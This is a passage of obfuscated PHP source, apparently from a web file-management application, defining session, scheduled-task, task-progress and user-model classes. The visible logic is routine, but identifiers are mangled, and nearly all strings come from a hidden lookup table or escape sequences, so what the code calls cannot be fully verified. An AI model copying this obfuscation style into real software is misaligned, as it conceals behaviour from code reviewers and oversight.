remove($Ï™èÚÎ¼) { self::init(); unset(self::$data[$Ï™èÚÎ¼]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[çâ¥×ø³][883])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $÷Â¸Â«¹ =& $_SERVER[çâ¥×ø³]; if (self::valueGet($÷Â¸Â«¹[799]) != $÷Â¸Â«¹[88]) { return; } if (self::valueGet($÷Â¸Â«¹[1657]) == $÷Â¸Â«¹[88]) { $¬ÕÚê ê = self::valueGet($÷Â¸Â«¹[1658]); if (time() - $¬ÕÚê ê > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($÷Â¸Â«¹[1657], $÷Â¸Â«¹[88]); self::log($÷Â¸Â«¹[1659] . ACTION . $÷Â¸Â«¹[1660]); Hook::bind($÷Â¸Â«¹[1661], $÷Â¸Â«¹[1662]); $æçüŞ”‰ = 0; while (!0) { self::cacheClear(); if (self::valueGet($÷Â¸Â«¹[799]) != $÷Â¸Â«¹[88]) { self::valueSet($÷Â¸Â«¹[1657], $÷Â¸Â«¹[212]); self::log($÷Â¸Â«¹[1663]); die; } $£«£®åÏ = time(); if ($£«£®åÏ - $æçüŞ”‰ >= 60) { self::valueSet(array($÷Â¸Â«¹[1657] => $÷Â¸Â«¹[88], $÷Â¸Â«¹[1658] => $£«£®åÏ), !1); $æçüŞ”‰ = $£«£®åÏ; } if (!file_exists(USER_SYSTEM . $÷Â¸Â«¹[1664])) { self::valueSet(array($÷Â¸Â«¹[1657] => $÷Â¸Â«¹[212], $÷Â¸Â«¹[799] => $÷Â¸Â«¹[212]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ÔÁş‡ğ =& $_SERVER[çâ¥×ø³]; http_close(); $GLOBALS[$ÔÁş‡ğ[1665]] = 1; $_SERVER[$ÔÁş‡ğ[1666]] = $ÔÁş‡ğ[1667]; $_COOKIE = array(); $GLOBALS[$ÔÁş‡ğ[536]] = 1; $GLOBALS[$ÔÁş‡ğ[1668]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $„º˜ç =& $_SERVER[çâ¥×ø³]; http_close(); self::valueSet($„º˜ç[799], $„º˜ç[212]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($„º˜ç[1657] => $„º˜ç[212], $„º˜ç[799] => $„º˜ç[88]), !1); } public static function taskSwitch() { $øÍÈŸúê =& $_SERVER[çâ¥×ø³]; $ÉÉäôàì = self::valueGet($øÍÈŸúê[799]) == $øÍÈŸúê[88] ? $øÍÈŸúê[212] : $øÍÈŸúê[88]; self::valueSet($øÍÈŸúê[799], $ÉÉäôàì); } public static function shutdownEvent() { $Š´äŞ³ö =& $_SERVER[çâ¥×ø³]; self::valueSet($Š´äŞ³ö[1657], $Š´äŞ³ö[212]); self::log($Š´äŞ³ö[1669]); } public static function config($Šêëµ, $ˆàæŞÔÊ) { self::valueSet($_SERVER[çâ¥×ø³][799], $Šêëµ); } private static function taskRunAll() { $ªöè÷ª› =& $_SERVER[çâ¥×ø³]; $¶Ñä¿Ã• = timeFloat(); $ğÀØÅüÜ = Model($ªöè÷ª›[1670])->listData(); $¤ßÎ§Ò· = count($ğÀØÅüÜ); for ($š»Ù¸…‰ = 0; $š»Ù¸…‰ < $¤ßÎ§Ò·; $š»Ù¸…‰++) { $ÏÏÓˆÑ… = $ğÀØÅüÜ[$š»Ù¸…‰]; if (!$ÏÏÓˆÑ…[$ªöè÷ª›[443]] || $ÏÏÓˆÑ…[$ªöè÷ª›[1671]] != $ªöè÷ª›[88]) { continue; } if (!self::taskTimeCheck($ÏÏÓˆÑ…)) { continue; } self::taskRun($ÏÏÓˆÑ…); } Hook::trigger($ªöè÷ª›[1672]); self::taskQueueRun($¶Ñä¿Ã•); } private static function taskQueueRun($ñò³´ºÃ) { $ËÜéîÅà = 10; while (!0) { $İÎ·˜²° = TaskQueue::run(); if ($İÎ·˜²° === !1) { break; } if (timeFloat() - $ñò³´ºÃ >= $ËÜéîÅà) { break; } } } private static function taskTimeCheck($ÓÔÙÀã) { $óß¯À®ˆ =& $_SERVER[çâ¥×ø³]; $íÛ Âßº = json_decode($ÓÔÙÀã[$óß¯À®ˆ[194]], !0); $èÖáÉÃÜ = intval($ÓÔÙÀã[$óß¯À®ˆ[1658]]); $é¦´°§ = strtotime($óß¯À®ˆ[1673] . $íÛ Âßº[$óß¯À®ˆ[1674]] . $óß¯À®ˆ[1675]) - strtotime($óß¯À®ˆ[1676]); $£ş×‘¶ = time() - strtotime(date($óß¯À®ˆ[1677]) . $óß¯À®ˆ[1678]); $¿Õ‚š¬¶ = $£ş×‘¶ >= $é¦´°§ && $£ş×‘¶ <= $é¦´°§ + 3600; switch ($íÛ Âßº[$óß¯À®ˆ[33]]) { case $óß¯À®ˆ[1679]: if (time() - $èÖáÉÃÜ < 3600 * 24 * 30) { return !1; } if ($íÛ Âßº[$óß¯À®ˆ[1679]] == date($óß¯À®ˆ[1680]) && $¿Õ‚š¬¶) { return !0; } break; case $óß¯À®ˆ[1681]: if (time() - $èÖáÉÃÜ < 3600 * 24 * 7) { return !1; } $ü®ı§‘‘ = date($óß¯À®ˆ[1682]) == 0 ? 7 : date($óß¯À®ˆ[1682]); if ($íÛ Âßº[$óß¯À®ˆ[1681]] == $ü®ı§‘‘ && $¿Õ‚š¬¶) { return !0; } break; case $óß¯À®ˆ[1674]: if (time() - $èÖáÉÃÜ < 3600 * 24) { return !1; } if ($¿Õ‚š¬¶) { return !0; } break; case $óß¯À®ˆ[1683]: if (time() - $èÖáÉÃÜ >= floatval($íÛ Âßº[$óß¯À®ˆ[1683]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $—ßşşÅĞ =& $_SERVER[çâ¥×ø³]; static $ÙÄúùÃÆ = 0; $ñ“®ø = 300; if (!$ÙÄúùÃÆ) { $ÙÄúùÃÆ = time(); } if (time() - $ÙÄúùÃÆ < $ñ“®ø) { return; } $ÙÄúùÃÆ = time(); $³ÎÖ°Œ = Model($—ßşşÅĞ[546])->db($—ßşşÅĞ[12]); if ($³ÎÖ°Œ) { $³ÎÖ°Œ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($—ßşşÅĞ[1684], $—ßşşÅĞ[1685]); die; } } public static function taskRun($äëêÏŸ‹) { $‡È¡ÚÙø =& $_SERVER[çâ¥×ø³]; self::log($‡È¡ÚÙø[1686] . $äëêÏŸ‹[$‡È¡ÚÙø[443]] . $‡È¡ÚÙø[1687] . $äëêÏŸ‹[$‡È¡ÚÙø[32]] . $‡È¡ÚÙø[1688] . $äëêÏŸ‹[$‡È¡ÚÙø[1689]]); Model($‡È¡ÚÙø[1670])->run($äëêÏŸ‹[$‡È¡ÚÙø[443]]); $¯¿ïÎ›é = timeFloat(); $İê†²÷Õ = $‡È¡ÚÙø[12]; switch ($äëêÏŸ‹[$‡È¡ÚÙø[33]]) { case $‡È¡ÚÙø[351]: $°ü€˜¡ = url_request($äëêÏŸ‹[$‡È¡ÚÙø[1689]], $‡È¡ÚÙø[245], !1, !1, !1, !1, 10); if ($°ü€˜¡[$‡È¡ÚÙø[799]]) { $İê†²÷Õ = strlen($°ü€˜¡[$‡È¡ÚÙø[1255]]); } break; case $‡È¡ÚÙø[244]: $İê†²÷Õ = Hook::apply($äëêÏŸ‹[$‡È¡ÚÙø[1689]]); default: break; } Model($‡È¡ÚÙø[1690])->add(array($‡È¡ÚÙø[1691] => $‡È¡ÚÙø[12], $‡È¡ÚÙø[1692] => $‡È¡ÚÙø[212], $‡È¡ÚÙø[33] => $‡È¡ÚÙø[1693] . $äëêÏŸ‹[$‡È¡ÚÙø[443]], $‡È¡ÚÙø[1694] => json_encode(array($‡È¡ÚÙø[32] => $äëêÏŸ‹[$‡È¡ÚÙø[32]], $‡È¡ÚÙø[1695] => timeFloat() - $¯¿ïÎ›é, $‡È¡ÚÙø[337] => $İê†²÷Õ)))); $ëï˜Êé¦ = $İê†²÷Õ ? $‡È¡ÚÙø[1696] . $İê†²÷Õ : $‡È¡ÚÙø[12]; self::log($‡È¡ÚÙø[1697] . $äëêÏŸ‹[$‡È¡ÚÙø[443]] . $‡È¡ÚÙø[165] . $ëï˜Êé¦); return !0; } public static function valueGet($”åÍ‘¥ï) { $ŒÎã†´Ä =& $_SERVER[çâ¥×ø³]; $ÍòšÓ¯¡ = $ŒÎã†´Ä[1698]; $ñêæ÷Ğ¾ = Model($ŒÎã†´Ä[476])->get($”åÍ‘¥ï, $ÍòšÓ¯¡); if (is_null($ñêæ÷Ğ¾)) { Model($ŒÎã†´Ä[476])->set($ŒÎã†´Ä[799], $ŒÎã†´Ä[88], $ÍòšÓ¯¡); Model($ŒÎã†´Ä[476])->set($ŒÎã†´Ä[1657], $ŒÎã†´Ä[212], $ÍòšÓ¯¡); $ñêæ÷Ğ¾ = Model($ŒÎã†´Ä[476])->get($”åÍ‘¥ï, $ÍòšÓ¯¡); } return $ñêæ÷Ğ¾; } private static function valueSet($ş›ÆÚŒ«, $äÁ”Ã‹) { $åù‚·×Ö =& $_SERVER[çâ¥×ø³]; $‹²£úæ = $åù‚·×Ö[1699]; CacheLock::lock($‹²£úæ); $‡©ºÄêİ = Model($åù‚·×Ö[476])->set($ş›ÆÚŒ«, $äÁ”Ã‹, $åù‚·×Ö[1698]); CacheLock::unlock($‹²£úæ); return $‡©ºÄêİ; } protected static function log($ü¯Ò½àï) { write_log($ü¯Ò½àï, $_SERVER[çâ¥×ø³][1685]); } private static function cacheClear() { $ó¨‚ö§Æ =& $_SERVER[çâ¥×ø³]; Cache::clearMemory(Model($ó¨‚ö§Æ[476])->cacheKey($ó¨‚ö§Æ[1698])); Cache::clearMemory(Model($ó¨‚ö§Æ[476])->cacheKey($ó¨‚ö§Æ[1700])); Model($ó¨‚ö§Æ[1670])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\156\151\156\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($œĞ“²ĞÄ, $©¿×ÙÊş = '', $¼°ï†ı× = 0, $µú€á¥ = '') { $Öôñóİù =& $_SERVER[çâ¥×ø³]; if (self::get($œĞ“²ĞÄ)) { return; } $this->task = array($Öôñóİù[443] => $œĞ“²ĞÄ, $Öôñóİù[1701] => USER_ID, $Öôñóİù[1598] => $µú€á¥, $Öôñóİù[494] => $Öôñóİù[12], $Öôñóİù[33] => $©¿×ÙÊş, $Öôñóİù[1117] => $Öôñóİù[12], $Öôñóİù[835] => $¼°ï†ı×, $Öôñóİù[1702] => 0, $Öôñóİù[1703] => 0, $Öôñóİù[1704] => 0, $Öôñóİù[1705] => timeFloat(), $Öôñóİù[1706] => 0, $Öôñóİù[1707] => 0, $Öôñóİù[1708] => 0, $Öôñóİù[1709] => 0, $Öôñóİù[799] => $Öôñóİù[1657]); $GLOBALS[$Öôñóİù[1710]] = 1; Hook::bind($Öôñóİù[1661], array($this, $Öôñóİù[1711])); Hook::bind($Öôñóİù[1712], array($this, $Öôñóİù[1713])); $this->startAfter(); Hook::trigger($Öôñóİù[1714], $this->task); $this->task[$Öôñóİù[1707]] = timeFloat(); } public function end($ÏÏ¹ë¥æ = '') { $ÕÇÚ’óÃ =& $_SERVER[çâ¥×ø³]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÕÇÚ’óÃ[1707]]) { self::valueSet($this->task[$ÕÇÚ’óÃ[443]], !1); } $this->isEnd = !0; if ($ÏÏ¹ë¥æ) { $this->task[$ÕÇÚ’óÃ[494]] = $ÏÏ¹ë¥æ; } self::log($ÕÇÚ’óÃ[1715] . $this->task[$ÕÇÚ’óÃ[443]] . $ÕÇÚ’óÃ[1716] . sprintf($ÕÇÚ’óÃ[900], timeFloat() - $this->task[$ÕÇÚ’óÃ[1705]]) . $ÕÇÚ’óÃ[1717]); Hook::unbind($ÕÇÚ’óÃ[1661], array($this, $ÕÇÚ’óÃ[1711])); Hook::unbind($ÕÇÚ’óÃ[1712], array($this, $ÕÇÚ’óÃ[1713])); $this->endAfter(); $Ìõ¾÷ = $this->task; $this->task = !1; Hook::trigger($ÕÇÚ’óÃ[1718], $Ìõ¾÷); } public function update($ ˜Û¶Ñ = 0, $‹Ã­ùÔõ = false) { $Ê”¦‡” =& $_SERVER[çâ¥×ø³]; $Ë¥—ıñè =& $this->task; if (!$Ë¥—ıñè) { return; } $Ë¥—ıñè[$Ê”¦‡”[1702]] += $ ˜Û¶Ñ; $Ë¥—ıñè[$Ê”¦‡”[1706]] = timeFloat(); if ($Ë¥—ıñè[$Ê”¦‡”[835]]) { if ($Ë¥—ıñè[$Ê”¦‡”[835]] < $Ë¥—ıñè[$Ê”¦‡”[1702]]) { $Ë¥—ıñè[$Ê”¦‡”[835]] = $Ë¥—ıñè[$Ê”¦‡”[1702]]; } $½Ôèìíº = timeFloat() - $Ë¥—ıñè[$Ê”¦‡”[1705]] - $Ë¥—ıñè[$Ê”¦‡”[1708]]; if ($½Ôèìíº <= 0) { $½Ôèìíº = 0.001; } $Ë¥—ıñè[$Ê”¦‡”[1703]] = $Ë¥—ıñè[$Ê”¦‡”[1702]] / $Ë¥—ıñè[$Ê”¦‡”[835]]; $Ë¥—ıñè[$Ê”¦‡”[1704]] = $Ë¥—ıñè[$Ê”¦‡”[1702]] / $½Ôèìíº; if ($Ë¥—ıñè[$Ê”¦‡”[1703]] > 0) { $Ë¥—ıñè[$Ê”¦‡”[1709]] = $½Ôèìíº * (1 - $Ë¥—ıñè[$Ê”¦‡”[1703]]) / $Ë¥—ıñè[$Ê”¦‡”[1703]]; } $Ë¥—ıñè[$Ê”¦‡”[1709]] = $Ë¥—ıñè[$Ê”¦‡”[1709]] <= 0 ? 0 : $Ë¥—ıñè[$Ê”¦‡”[1709]]; } $this->updateAfter(); $á‰£˜£ö = 0.2; if (timeFloat() - $Ë¥—ıñè[$Ê”¦‡”[1707]] < $á‰£˜£ö && !$‹Ã­ùÔõ) { return; } $¤‘ôœë = self::get($Ë¥—ıñè[$Ê”¦‡”[443]]); $±²°·âÛ = $¤‘ôœë[$Ê”¦‡”[799]]; if ($±²°·âÛ == self::STATYS_KILL) { $ˆé²…±² = array($Ê”¦‡”[1719] => LNG($Ê”¦‡”[1720]), $Ê”¦‡”[1265] => !1); Cache::set($Ê”¦‡”[1721] . $this->task[$Ê”¦‡”[443]], $ˆé²…±², 30); $this->onKill(); $this->end(); die; } else { if ($±²°·âÛ == self::STATYS_STOP) { $úäëüº· = 2; $¤‘ôœë[$Ê”¦‡”[1708]] += $úäëüº·; self::valueSet($Ë¥—ıñè[$Ê”¦‡”[443]], $¤‘ôœë); sleep($úäëüº·); $this->update(); return; } } $Ë¥—ıñè[$Ê”¦‡”[799]] = $±²°·âÛ ? $±²°·âÛ : $Ë¥—ıñè[$Ê”¦‡”[799]]; $Ë¥—ıñè[$Ê”¦‡”[1708]] = $¤‘ôœë[$Ê”¦‡”[1708]] ? $¤‘ôœë[$Ê”¦‡”[1708]] : 0; $Ë¥—ıñè[$Ê”¦‡”[1707]] = timeFloat(); Hook::trigger($Ê”¦‡”[1722], $Ë¥—ıñè); self::valueSet($Ë¥—ıñè[$Ê”¦‡”[443]], $Ë¥—ıñè); } public function onKillSet($ïÄËµæ, $Œ×ÀÍ›› = array()) { $this->onKillCall = array($ïÄËµæ, $Œ×ÀÍ››); } public function onKill() { $¥ÌØåçÀ =& $_SERVER[çâ¥×ø³]; self::log($¥ÌØåçÀ[1715] . $this->task[$¥ÌØåçÀ[443]] . $¥ÌØåçÀ[1723]); Hook::trigger($¥ÌØåçÀ[1724], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($º”àŞÊæ) { $©û›“àÂ =& $_SERVER[çâ¥×ø³]; Cache::set($©û›“àÂ[1721] . $this->task[$©û›“àÂ[443]], $º”àŞÊæ, 60); return $º”àŞÊæ; } public static function get($¼ä…Ëà) { $¸İß’çˆ =& $_SERVER[çâ¥×ø³]; $¡Ì±îÍ» = self::valueGet($¼ä…Ëà); if (is_array($¡Ì±îÍ») && $¡Ì±îÍ»[$¸İß’çˆ[1725]]) { $ì”‹¦û› = ActionApply($¡Ì±îÍ»[$¸İß’çˆ[1725]], array($¡Ì±îÍ»)); $¡Ì±îÍ» = is_array($ì”‹¦û›) ? $ì”‹¦û› : $¡Ì±îÍ»; } return $¡Ì±îÍ»; } public static function listData() { $èãÅ™İ¤ = self::valueGet(); return array_sort_by($èãÅ™İ¤, $_SERVER[çâ¥×ø³][1705], !0); } public static function kill($Î¯²²È) { return self::changeStatus($Î¯²²È, self::STATYS_KILL); } public static function stop($Â÷ŒÂ¾„) { return self::changeStatus($Â÷ŒÂ¾„, self::STATYS_STOP); } public static function restart($öêÒ­) { return self::changeStatus($öêÒ­, self::STATYS_RUNNING); } public static function killAll() { $•÷È”•¿ =& $_SERVER[çâ¥×ø³]; $Ş®÷‹çƒ = self::listData(); foreach ($Ş®÷‹çƒ as $Ç˜Ü•²è) { self::kill($Ç˜Ü•²è[$•÷È”•¿[443]]); } sleep(2); foreach ($Ş®÷‹çƒ as $Ç˜Ü•²è) { self::valueSet($Ç˜Ü•²è[$•÷È”•¿[443]], !1); } } private static function changeStatus($ñ¬Í‰óŞ, $Ò§Î¬İì) { $ÜÏ”í‹“ =& $_SERVER[çâ¥×ø³]; $‘èÙ²èÅ = self::valueGet($ñ¬Í‰óŞ); if (!$‘èÙ²èÅ) { return !1; } $‘èÙ²èÅ[$ÜÏ”í‹“[799]] = $Ò§Î¬İì; self::valueSet($ñ¬Í‰óŞ, $‘èÙ²èÅ); self::log($ÜÏ”í‹“[1726] . $‘èÙ²èÅ[$ÜÏ”í‹“[443]] . $ÜÏ”í‹“[1727] . $Ò§Î¬İì); return !0; } public static function valueGet($ÒùàÏÕâ = false) { $·ûƒÕ¡Ó =& $_SERVER[çâ¥×ø³]; if ($ÒùàÏÕâ) { $ç°‰æÇ¶ = Model($·ûƒÕ¡Ó[488])->where(array($·ûƒÕ¡Ó[94] => $ÒùàÏÕâ, $·ûƒÕ¡Ó[33] => $·ûƒÕ¡Ó[1124]))->find(); return $ç°‰æÇ¶ ? json_decode($ç°‰æÇ¶[$·ûƒÕ¡Ó[418]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ĞÓ¼ ó— = false) { $À§‹ÚËà =& $_SERVER[çâ¥×ø³]; $ã…¶ä¸ = array($À§‹ÚËà[33] => $À§‹ÚËà[1124]); if ($ĞÓ¼ ó—) { $ã…¶ä¸[$À§‹ÚËà[1701]] = $ĞÓ¼ ó—; } $ß¦´¦œÑ = Model($À§‹ÚËà[488])->where($ã…¶ä¸)->select(); $ß¦´¦œÑ = $ß¦´¦œÑ ? $ß¦´¦œÑ : array(); foreach ($ß¦´¦œÑ as $¢É÷›ìú => $¸œ¤ìœ) { $ß¦´¦œÑ[$¢É÷›ìú] = json_decode($¸œ¤ìœ[$À§‹ÚËà[418]], !0); } return $ß¦´¦œÑ; } public static function valueSet($¨œ¦Æ”ë, $Â¿Ì¡Ï©) { $Ô«ˆªæÖ =& $_SERVER[çâ¥×ø³]; if (!$Â¿Ì¡Ï©) { return Model($Ô«ˆªæÖ[488])->where(array($Ô«ˆªæÖ[94] => $¨œ¦Æ”ë, $Ô«ˆªæÖ[33] => $Ô«ˆªæÖ[1124]))->delete(); } $ÚŒ‘²ÂÈ = json_encode($Â¿Ì¡Ï©); if (!$ÚŒ‘²ÂÈ) { ob_start(); var_dump($Â¿Ì¡Ï©); $õı€„·¯ = ob_get_clean(); self::log($Ô«ˆªæÖ[1728] . json_encode_force($õı€„·¯)); } if (!$¨œ¦Æ”ë || !$Â¿Ì¡Ï©[$Ô«ˆªæÖ[443]]) { return !1; } $­çç¡£Œ = array($Ô«ˆªæÖ[33] => $Ô«ˆªæÖ[1124], $Ô«ˆªæÖ[1701] => USER_ID, $Ô«ˆªæÖ[94] => $¨œ¦Æ”ë, $Ô«ˆªæÖ[418] => $ÚŒ‘²ÂÈ); $Õ°İòöÀ = $Ô«ˆªæÖ[1729]; CacheLock::lock($Õ°İòöÀ); Model($Ô«ˆªæÖ[488])->add($­çç¡£Œ, array(), !0); CacheLock::unlock($Õ°İòöÀ); } public static function log($‹à–×¼) { if (!GLOBAL_DEBUG) { return; } write_log($‹à–×¼, $_SERVER[çâ¥×ø³][1730]); } } goto dã¨ùíóÜ; AÄ›ğœÄáˆ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x6a\157\x62\x4c\151\x73\164"; public $field = array("\156\x61\x6d\145", "\144\x65\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\x65\154\x66\112\x6f\142\114\151\x73\x74"; public function listData($‘Ûóú› = false, $©ÃºÃ = "\163\x6f\x72\x74", $çúâ‹±È = false) { return parent::listData($‘Ûóú›, $©ÃºÃ, $çúâ‹±È); } public function remove($­şùÊğÈ) { return parent::remove($­şùÊğÈ); } public function add($ÎÏÜêá) { $‰®è¤¯¿ =& $_SERVER[çâ¥×ø³]; if ($this->findByName($ÎÏÜêá[$‰®è¤¯¿[32]])) { return !1; } $ÎÏÜêá[$‰®è¤¯¿[1923]] = $this->getSort(); return parent::insert($ÎÏÜêá); } private function getSort() { $Öæã„ò =& $_SERVER[çâ¥×ø³]; $¸Ç›Ñª = parent::listData(); $‹ññå¸º = array_to_keyvalue($¸Ç›Ñª, $Öæã„ò[12], $Öæã„ò[1923]); return empty($‹ññå¸º) ? 0 : max($‹ññå¸º) + 1; } public function update($¹Ù–Ëš, $¡ÔÆĞ×Ü) { $ŞüÆñ“« =& $_SERVER[çâ¥×ø³]; $‡­™ğ…À = parent::listData($¹Ù–Ëš); $ÓÇÒ½Ùó = $this->findByName($¡ÔÆĞ×Ü[$ŞüÆñ“«[32]]); if (!$‡­™ğ…À || $ÓÇÒ½Ùó && $ÓÇÒ½Ùó[$ŞüÆñ“«[443]] != $‡­™ğ…À[$ŞüÆñ“«[443]]) { return !1; } return parent::update($¹Ù–Ëš, $¡ÔÆĞ×Ü); } public function setUserJob($ÄîĞı‹Â, $ÎğãÊ‚¡) { $´Õ€”Ï³ =& $_SERVER[çâ¥×ø³]; if (!is_array($ÎğãÊ‚¡)) { $ÎğãÊ‚¡ = array($ÎğãÊ‚¡); } $‰î»¹ = parent::listData(); $€—È¤ä± = array_to_keyvalue($‰î»¹, $´Õ€”Ï³[32]); $í¶ëŞ¤÷ = $´Õ€”Ï³[422]; foreach ($ÎğãÊ‚¡ as $­¼×ú) { if ($€—È¤ä±[$­¼×ú]) { $í¶ëŞ¤÷ .= $€—È¤ä±[$­¼×ú][$´Õ€”Ï³[443]] . $´Õ€”Ï³[50]; } else { $Ğ•íË¼… = $this->add($­¼×ú); $í¶ëŞ¤÷ .= $Ğ•íË¼… . $´Õ€”Ï³[50]; } } $í¶ëŞ¤÷ = rtrim($í¶ëŞ¤÷, $´Õ€”Ï³[50]); Model($´Õ€”Ï³[567])->metaSet($ÄîĞı‹Â, self::JOB_KEY, $í¶ëŞ¤÷); } public function getUserJob($âº°óéú) { $Å‚¯á½É = Model($_SERVER[çâ¥×ø³][567])->metaGet($âº°óéú); return $this->getUserJobInfo($Å‚¯á½É[self::JOB_KEY]); } public function getUserJobInfo($¥Ùœƒı¡) { $ğ€¢®Ãö =& $_SERVER[çâ¥×ø³]; $À§îö™² = explode($ğ€¢®Ãö[50], $¥Ùœƒı¡); $¯¢°çÅÈ = parent::listData(); $¯¢°çÅÈ = array_remove_key($¯¢°çÅÈ, $ğ€¢®Ãö[215]); $”½‰¬£ˆ = array(); foreach ($À§îö™² as $˜å³±ÛÇ) { if (isset($¯¢°çÅÈ[$˜å³±ÛÇ])) { $”½‰¬£ˆ[] = $¯¢°çÅÈ[$˜å³±ÛÇ]; } } return $”½‰¬£ˆ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\145" => "\165\x73\x65\162\x5f\155\145\x74\x61", "\x6d\145\x74\141\106\151\x65\x6c\x64" => "\x75\x73\145\162\111\104"); protected $simpleField = "\165\x73\x65\x72\111\104\x2c\156\151\x63\153\x4e\x61\x6d\145\54\156\x61\155\145\x2c\x61\x76\141\164\x61\162\54\163\145\x78\54\163\x74\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ä±µ‹ºÁ) { $à ÃÌé =& $_SERVER[çâ¥×ø³]; $ü³¯×¶± = $à ÃÌé[2352]; return array($à ÃÌé[1977] => array($Ä±µ‹ºÁ[0], $ü³¯×¶±), $à ÃÌé[1979] => array($Ä±µ‹ºÁ[0], $ü³¯×¶±), $à ÃÌé[2353] => array($Ä±µ‹ºÁ[0], $ü³¯×¶±)); } protected function getInfo($—îŠ‹¸¸, $´äêéóÕ = false) { $ÔÅö˜Í© = $this->getInfoSimple($—îŠ‹¸¸); if (!is_array($ÔÅö˜Í©)) { return array(); } if ($´äêéóÕ) { return $this->_getInfoApply($ÔÅö˜Í©); } return $this->cacheFunctionGet($_SERVER[çâ¥×ø³][1981], $—îŠ‹¸¸); } protected function getInfoFull($ˆìŞÚ¥İ, $„Ê«®Ô¸ = false) { $¹«‘ÄËµ = $this->getInfoSimple($ˆìŞÚ¥İ); if (!is_array($¹«‘ÄËµ)) { return array(); } if ($„Ê«®Ô¸) { return $this->_getInfoApply($¹«‘ÄËµ, !0); } return $this->cacheFunctionGet($_SERVER[çâ¥×ø³][2354], $ˆìŞÚ¥İ); } private function _getInfoApply($öõ¢úï«, $åÜ¨½Êğ = false) { $«ï‡¨í´ =& $_SERVER[çâ¥×ø³]; if (!$öõ¢úï«) { return $öõ¢úï«; } $Ã›ûÎ¶ë = md5($«ï‡¨í´[2355] . $öõ¢úï«[$«ï‡¨í´[942]] . $«ï‡¨í´[2356] . $öõ¢úï«[$«ï‡¨í´[32]]); $öõ¢úï« = $this->_listDataApplyItem($öõ¢úï«); $ãšä¦£‡ = Model($«ï‡¨í´[1385])->metaGet($öõ¢úï«[$«ï‡¨í´[87]][$«ï‡¨í´[181]]); $öõ¢úï«[$«ï‡¨í´[2357]] = $Ã›ûÎ¶ë; $öõ¢úï«[$«ï‡¨í´[87]][$«ï‡¨í´[2173]] = isset($ãšä¦£‡[$«ï‡¨í´[2174]]) ? $ãšä¦£‡[$«ï‡¨í´[2174]] : null; if ($åÜ¨½Êğ) { $öõ¢úï«[$«ï‡¨í´[507]] = $this->metaGet($öõ¢úï«[$«ï‡¨í´[1701]]); } return $öõ¢úï«; } protected function getInfoSimple($ÂÈŞÅÃÖ, $à¶íÂš = false) { $ùªñ¨­ë =& $_SERVER[çâ¥×ø³]; if (!$ÂÈŞÅÃÖ) { return array(); } if ($à¶íÂš) { $¯ù¯Ëçß = $this->where(array($ùªñ¨­ë[1701] => intval($ÂÈŞÅÃÖ)))->find(); if (!is_array($¯ù¯Ëçß)) { return array(); } $¯ù¯Ëçß[$ùªñ¨­ë[2358]] = Action($ùªñ¨­ë[2359])->parseUrl($¯ù¯Ëçß[$ùªñ¨­ë[2358]]); return $¯ù¯Ëçß; } return $this->cacheFunctionGet($ùªñ¨­ë[1982], $ÂÈŞÅÃÖ); } protected function getInfoSimpleOuter($‚Ğ‘¢Ğˆ) { $˜ÁİãÔÍ =& $_SERVER[çâ¥×ø³]; if (!$‚Ğ‘¢Ğˆ || $‚Ğ‘¢Ğˆ == 0) { return array($˜ÁİãÔÍ[1701] => $˜ÁİãÔÍ[212], $˜ÁİãÔÍ[32] => $˜ÁİãÔÍ[163] . LNG($˜ÁİãÔÍ[2360]) . $˜ÁİãÔÍ[165], $˜ÁİãÔÍ[2358] => STATIC_PATH . $˜ÁİãÔÍ[2361]); } $¥ğüÕø« = $this->cacheFunctionGet($˜ÁİãÔÍ[1982], $‚Ğ‘¢Ğˆ); $¼ê¸ŒâÖ = array_field_key($¥ğüÕø«, explode($˜ÁİãÔÍ[50], $this->simpleField)); if (!$¼ê¸ŒâÖ) { return array($˜ÁİãÔÍ[1701] => $˜ÁİãÔÍ[1241], $˜ÁİãÔÍ[32] => $˜ÁİãÔÍ[163] . LNG($˜ÁİãÔÍ[2362]) . $˜ÁİãÔÍ[165], $˜ÁİãÔÍ[2358] => STATIC_PATH . $˜ÁİãÔÍ[2363]); } $¼ê¸ŒâÖ[$˜ÁİãÔÍ[2358]] = Action($˜ÁİãÔÍ[2359])->parseUrl($¼ê¸ŒâÖ[$˜ÁİãÔÍ[2358]]); return $¼ê¸ŒâÖ; } protected function groupUser($ı¬ªÄÍ¬) { } public static function errorLang($üŒºÛôê) { $ü„¯€ºŸ =& $_SERVER[çâ¥×ø³]; $­û‘Á¨ß = array(self::ERROR_USER_NOT_EXISTS => $ü„¯€ºŸ[2364], 